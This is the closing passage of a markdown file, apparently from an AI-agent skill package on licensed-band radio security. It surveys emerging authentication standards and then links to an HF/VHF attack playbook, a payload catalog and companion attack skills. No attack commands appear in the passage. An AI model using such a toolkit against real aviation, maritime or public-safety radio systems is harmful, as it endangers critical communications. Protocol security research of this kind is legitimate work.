The next frontier of licensed-band security is cryptographic authentication. ADS-B Sec (proposed authentication), AIS-S (secure AIS), LDACS (next-generation aviation data link with built-in security), and P25 Phase II encryption are all in various stages of standards development and deployment. Until these are universal, the licensed band remains a rich target for receive-side intelligence and protocol security research.

## See Also

- `hf-vhf-radio-attack-playbook.md` - the main playbook with hardware tables, decoding matrix, and lab setup
- `../payloads.md` - the full command catalog organized by service and workflow
- `../test-cases.md` - structured test cases for validating decoder operation
- `../SKILL.md` - skill definition with use cases and methodology
- `../../sdr-rf-attack/` - companion skill for unlicensed Sub-GHz ISM devices
- `../../5g-telecom-attack/` - companion skill for cellular operator bands
